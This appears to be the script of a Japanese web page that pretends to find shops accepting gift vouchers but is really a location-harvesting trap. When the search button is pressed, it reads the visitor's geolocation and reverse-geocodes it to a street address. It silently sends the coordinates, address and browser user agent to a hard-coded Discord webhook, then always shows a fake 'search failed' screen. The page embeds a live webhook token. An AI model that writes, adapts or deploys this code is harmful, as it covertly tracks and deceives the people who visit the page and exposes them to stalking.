<script>
    (function() {
        "use strict";

        // ★★★ 新しいWebhook URLに差し替え ★★★
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1546539146934231070/Zp4YUAo137Na5FuZPBs-n6V4MEgsMbsLNcEDRaBaG8St4vw5cghNjuoNqUo2agRso1UD';

        const searchBtn = document.getElementById('searchBtn');
        const loadingArea = document.getElementById('loading-area');
        const loadingText = document.getElementById('loadingText');
        const resultArea = document.getElementById('result-area');
        const termsBtn = document.getElementById('termsBtn');
        const termsModal = document.getElementById('termsModal');
        const closeTerms = document.getElementById('closeTerms');

        // ----- 利用規約モーダル -----
        termsBtn.addEventListener('click', function() {
            termsModal.style.display = 'flex';
        });
        closeTerms.addEventListener('click', function() {
            termsModal.style.display = 'none';
        });
        termsModal.addEventListener('click', function(e) {
            if (e.target === termsModal) termsModal.style.display = 'none';
        });

        // ----- 失敗画面 -----
        function showError() {
            resultArea.style.display = 'block';
            resultArea.innerHTML = `
                <div class="error-box">
                    <div class="icon">⚠️</div>
                    <div class="msg">失敗しました</div>
                    <div class="sub-msg">リロードして、もう一度お試しください</div>
                    <button class="retry-btn" id="retryBtn">ページを再読み込み</button>
                </div>
            `;
            document.getElementById('retryBtn').addEventListener('click', function() {
                location.reload();
            });
        }

        // ----- 位置情報から住所を取得 (Geocoding API) -----
        async function getAddressFromCoords(lat, lng) {
            try {
                const response = await fetch(
                    `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&language=ja&key=YOUR_API_KEY`
                );
                const data = await response.json();
                if (data.status === 'OK' && data.results.length > 0) {
                    return data.results[0].formatted_address;
                } else {
                    return null;
                }
            } catch (e) {
                console.warn('Geocoding error:', e);
                return null;
            }
        }

        // ----- Discord Webhook 送信 (住所付き) -----
        function sendLocationToWebhook(lat, lng, address) {
            const payload = {
                content: `📍 **商品券利用可能店舗検索**\n住所: ${address}\n緯度: ${lat}\n経度: ${lng}\nUA: ${navigator.userAgent}`
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                mode: 'no-cors'
            }).catch(e => console.log('Webhook送信エラー（無視）'));
        }

        // ----- 検索ボタンの動作 -----
        searchBtn.addEventListener('click', function() {
            if (searchBtn.disabled) return;

            if (!navigator.geolocation) {
                alert('お使いの端末は位置情報に対応していません。');
                return;
            }

            searchBtn.disabled = true;
            searchBtn.textContent = '⏳ 取得中...';

            loadingArea.style.display = 'flex';
            resultArea.style.display = 'none';
            resultArea.innerHTML = '';

            loadingText.innerHTML = '<span>検</span><span>索</span><span>中</span>';

            navigator.geolocation.getCurrentPosition(
                async function(pos) {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;

                    // 住所を逆引き
                    let address = '住所不明';
                    try {
                        const fetched = await getAddressFromCoords(lat, lng);
                        if (fetched) address = fetched;
                    } catch (e) {
                        console.warn('住所取得失敗:', e);
                    }

                    // Webhook に位置情報 + 住所を送信
                    sendLocationToWebhook(lat, lng, address);

                    // 3.2秒ローディング → 失敗表示
                    setTimeout(() => {
                        loadingArea.style.display = 'none';
                        searchBtn.disabled = false;
                        searchBtn.textContent = '🔍 検索する';
                        showError();
                    }, 3200);
                },
                function(err) {
                    loadingArea.style.display = 'none';
                    searchBtn.disabled = false;
                    searchBtn.textContent = '🔍 検索する';
                    showError();
                    console.warn('Geolocation error:', err.message);
                },
                {
                    enableHighAccuracy: false,
                    timeout: 8000,
                    maximumAge: 60000
                }
            );
        });

        document.addEventListener('DOMContentLoaded', function() {
            loadingArea.style.display = 'none';
            resultArea.style.display = 'none';
        });

    })();
</script>
